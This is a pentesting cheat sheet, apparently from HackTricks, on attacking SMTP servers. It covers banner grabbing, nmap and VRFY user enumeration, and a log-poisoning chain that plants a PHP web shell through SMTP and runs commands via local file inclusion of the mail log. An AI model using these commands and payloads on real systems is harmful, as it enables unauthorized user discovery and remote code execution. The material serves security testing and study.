https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

### Initial checks

Banner grabbing:
```bash
nc -vn <IP> 25
```

Nmap enumeration:
```bash
nmap -p25 --script smtp* <IP>
```
--> Identify version and check for exploits using searchsploit

Send email:
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

SMTP user enum:
```
smtp-user-enum -M VRFY -U users.txt -t <IP>
```


### LFI -> Log poisoning to RCE

Connect to SMTP using telnet: [Guide](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)

Approach 1:
```bash
telnet <IP> 25

MAIL FROM:<gmail@gmail.com> 
RCPT TO:<?php system($_GET['c']); ?>
```

Approach 2:
```bash
telnet <IP> 25

MAIL FROM: <raj>
RCPT TO: Helios
data
<?php system($_GET['c']); ?>
```

Now use LFI on the webpage:
```bash
http://<URL>/<PAGE>.php?file=/var/log/mail&c=id
```
